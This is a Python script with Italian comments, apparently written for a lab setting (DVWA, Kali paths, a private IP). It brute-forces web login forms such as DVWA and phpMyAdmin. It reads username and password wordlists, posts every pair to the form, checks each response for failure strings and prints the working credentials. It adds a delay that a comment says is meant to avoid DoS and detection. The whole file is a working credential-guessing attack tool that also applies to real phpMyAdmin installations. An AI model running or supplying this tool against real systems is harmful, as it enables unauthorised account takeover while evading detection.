import requests
import time
from termcolor import colored 

url = str(input("Inserisci l'Url remoto (es: http://192.168.32.101/dvwa/login.php o http://192.168.32.101/phpMyAdmin/index.php): ")).strip() # Url remoto

while not (url.startswith("http://") or url.startswith("https://")):  # Controllo se è un url , il not sta quasi come !=
    print("URL non valido. Assicurati di includere il protocollo (http:// o https://).")
    url = str(input("Inserisci l'Url remoto (es: http://192.168.32.101/dvwa/login.php o http://192.168.32.101/phpMyAdmin/index.php): ")).strip() #Stringa senza spazi 

print("") # Spazio

if 'phpMyAdmin' in url:
    print("Phpmyadmin rilevato nell'url.")
    print("") # Spazio
else:
    print("DVWA rilevato nell'url.")
    print("") # Spazio


username_file_utente = str(input("Inserisci la PATH della lista degli username che vuoi utilizzare: (es: /home/kali/Desktop/usernames.txt)")).strip() #Stringa senza spazi 

                
print("") # Spazio
password_file_utente = str(input("Inserisci la PATH della lista delle password che vuoi utilizzare: (es: /home/kali/Desktop/password.txt) ")).strip() #Stringa senza spazi
print("")
variabilePOSTu = str(input("Inserisci l'ID utilizzato dall'username del form (POST) :")).strip() #Stringa senza spazi
print("")
variabilePOSTp = str(input("Inserisci l'ID utilizzato dalla password del form (POST) :")).strip()#Stringa senza spazi
print("")
while (1):
        secondi = int(input("Inserisci i secondi tra una richiesta e l'altra (0-5): ")) # Secondi int cast
        if 0 <= secondi <= 5: # Se i secondi sono tra 0 e 5 va tutto bene
            break
        else:
            print("Il valore deve essere compreso tra 0 e 5.")
            secondi = int(input("Inserisci i secondi tra una richiesta e l'altra (0-5): ")) # Secondi int
        
    


username_file = open(username_file_utente) # Apro il file dell'utente
password_file = open(password_file_utente) # Apro il file dell'utente
funzionanti=""

user_list = username_file.readlines() #Leggo il file con gli username inserito dall'utente
pwd_list = password_file.readlines() #Leggo il file con le password inserite dall'utente

trovata = False #Imposto la variabile in false

for user in user_list: #Fornisco un loop in base alla lunghezza della userlist(Parole)
    user = user.rstrip() #Spazi a destra
    for pwd in pwd_list:  #Fornisco un loop in base alla lunghezza della userlist(Parole)
        pwd = pwd.rstrip() #Spazi a destra

        session = requests.Session() # Apro una sessione
        time.sleep(secondi) # Imposto um timer per le richieste( COsi si evita il Dos e la rilevazione)

        if 'phpMyAdmin' in url: # Controllo se nell'url è presente phpmyadmmin
         response = session.post(url, data={variabilePOSTu: user, variabilePOSTp: pwd, "Go": 'submit'}) # Per phpmyadmin
        else:
         response = session.post(url, data={variabilePOSTu: user, variabilePOSTp: pwd, "Login": 'submit'})   #per dvwa
        #print(user, '-', pwd) # Metto i parametri del post

        if "Login failed" in str(response.content): # Se trovo questa stringa il login è fallito #DVWA
            print("Tentativo fallito con :", user, "-", pwd)
        elif "Access denied" in str(response.content): # Se trovo questa stringa il login è fallito #Phpmyadmin
            print("Tentativo fallito con :", user, "-", pwd)
        else:
            print("Username e password funzionanti:", user, "-", pwd) # Questi funzionano
            funzionanti= "L'username che devi utilizzare è  : '" + user + "'"+ " e la password è '" + pwd + "'"
            trovata=True # Se la trova la imposto a True
            break #Interrompo il loop

    if trovata: # Interrompo il ciclo
        break
      	         
print("")   #
if funzionanti == "":
   print ("Nessuna password è stata trovata") # Coloro la risposta
else:
   print (colored(funzionanti, 'red')) # Coloro la risposta


username_file.close() #Chiudo il file
password_file.close() #Chiudo il file
